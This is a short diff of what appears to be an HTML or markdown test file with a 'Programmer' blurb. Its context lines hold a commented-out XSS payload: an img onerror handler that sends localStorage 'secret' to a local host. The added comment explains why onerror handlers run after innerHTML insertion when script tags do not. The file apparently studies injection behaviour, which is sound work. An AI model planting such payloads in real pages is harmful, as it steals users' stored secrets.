@@ -92,3 +92,8 @@ Programmer
 A machine that turns coffee to code.
 <img src='no.img' onerror='javascript:this.style.display = "none";alert("got your secret data!!");fetch("http://127.0.0.1:42069/secret/"+localStorage.getItem("secret"));'> 
 -->
+
+
+<!-- Script tags inserted into the DOM using innerHTML are not executed at the time of injection, and the browser only
+executes inline scripts when the page is parsed initially. Scripts associated with events (e.g., onerror) are called
+when the event is raised (e.g., showing an image when the img tag is inserted into the DOM). -->
